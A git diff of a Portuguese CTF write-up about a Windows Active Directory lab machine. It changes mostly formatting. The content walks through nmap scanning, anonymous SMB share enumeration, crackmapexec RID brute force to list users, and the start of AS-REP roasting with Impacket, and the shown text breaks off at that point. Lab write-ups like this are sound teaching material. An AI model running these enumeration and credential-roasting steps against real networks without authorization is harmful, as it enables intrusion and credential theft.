@@ -30,7 +30,7 @@ Trata-se de uma máquina Windows, um ambiente ideal para treinar um pouco a expl
 
 Como etapa inicial, vamos começar pelo bom e velho `nmap`, precisamos descobrir quais portas estão abertas para então pensar em caminhos de ataque.
 
-````plaintext
+```plaintext
 ➜  vulnnet sudo nmap -sS -p- --min-rate 5000 10.201.34.159  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 19:08 EST
 Not shown: 65517 filtered tcp ports (no-response)
@@ -54,7 +54,8 @@ PORT      STATE SERVICE
 49696/tcp open  unknown
 
 ```
-Particularmente eu gosto sempre de começar por esse scan mais simples apenas para ter uma noção do que esperar na máquina. 
+
+Particularmente eu gosto sempre de começar por esse scan mais simples apenas para ter uma noção do que esperar na máquina.
 Geralmente é comum encontrar servidores Windows em ambientes CTFs com esse tanto de porta aberta. Antes de qualquer coisa, vamos nos aprofundar um pouco mais nestes serviços, talvez tenha algum serviço ‘fora do lugar” (ou seja, rodando em uma porta diferente da sua usual).
 
 Aprofundando um pouco mais:
@@ -94,6 +95,7 @@ Host script results:
 |_    Message signing enabled and required
 
 ```
+
 Pelo resultado, vemos que se trata de um ambiente AD, temos o domínio desse ambiente (vulnnet-rst.local), e essa máquina seria um DC (porta 53 aberta indicando DNS, seria uma boa dica para concluir isso). Neste momento seguiremos uma abordagem mais simples: será que temos acesso anônimo ao SMB?
 
 Vamos tentar, geralmente é um bom caminho começar por lá, visto que nos permite, além de possível acesso aos compartilhamentos de rede, comunicação via RPC.
@@ -129,14 +131,15 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Closed 1 connections                                                                                                    
 
 ```
-Ponha qualquer usuário teste ali, eu coloquei `biel` , apenas para teste. 
+
+Ponha qualquer usuário teste ali, eu coloquei `biel` , apenas para teste.
 Excelente! veja que temos permissão de leitura em alguns compartilhamentos. Para te adiantar, li e não encontrei nada útil nesses compartilhamentos que podemos ler, mas sugiro dar uma olhada sempre.
 
 RID Bruteforce
-Beleza, já que podemos "conversar" com o SMB mesmo sem um usuário válido, uma boa abordagem seria tentar fazer um  RID bruteforce. 
+Beleza, já que podemos "conversar" com o SMB mesmo sem um usuário válido, uma boa abordagem seria tentar fazer um  RID bruteforce.
 Essa técnica, basicamente, consiste em tentar achar RID válidos que identificam usuários existentes no ambiente. Sugiro dar uma pesquisada mais sobre, vale a pena.
 
-Talvez você se pergunte para que isso? O lance é que com uma lista de usuários válidos, tentaremos executar um ASREP-Roasting. 
+Talvez você se pergunte para que isso? O lance é que com uma lista de usuários válidos, tentaremos executar um ASREP-Roasting.
 
 ```plaintext
 ➜  vulnnet crackmapexec smb '10.201.101.209' -u 'biel' -p '' -d 'vulnnet-rst.local' --rid-brute
@@ -175,6 +178,7 @@ SMB         10.201.101.209  445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (Si
 
 
 ```
+
 Vamos dar uma filtrada nesses resultados! Jogue o resultado em um arquivo, e dê uma filtrada:
 
 ```plaintext
@@ -189,9 +193,11 @@ t-skid
 j-goldenhand
 j-leet
 ```
+
 Beleza, já temos alguns usuários para tentar avançar no ambiente!
 ASEP-Roasting
 Vamos tentar o ASREP-Roasting agora:
+
 ```plaintext
 ➜  vulnnet GetNPUsers.py 'vulnnet-rst.local'/ -usersfile ./users.txt -dc-ip 10.201.101.209 -format 'hashcat'
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
